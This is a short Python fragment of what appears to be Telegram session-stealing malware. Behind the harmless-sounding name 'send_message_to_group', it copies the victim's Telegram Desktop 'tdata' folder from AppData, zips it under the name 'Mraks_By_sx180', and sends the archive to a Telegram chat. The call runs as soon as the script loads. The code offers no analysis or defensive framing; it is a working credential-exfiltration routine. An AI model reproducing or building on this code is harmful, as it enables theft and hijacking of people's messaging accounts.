def send_message_to_group(chat_id):
    user = os.getlogin()
    if os.path.exists(user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"):
        source_dir = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'
        temp_dir = os.path.join(os.getcwd(), 'temp')
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir)  # Создаем папку, если её нет
        output_zip = os.path.join(temp_dir, 'Mraks_By_sx180')
        create_zip_archive(source_dir, output_zip + '.zip')
        if os.path.exists(output_zip + '.zip'):
            send_file_to_telegram_once(output_zip + '.zip', 'Mraks_By_sx180.zip')
        else:
            print("Failed to create or send zip file.")
            send_file_to_telegram_once(output_zip + '.zip', 'Mraks_By_sx180.zip')

send_message_to_group(chat_id)
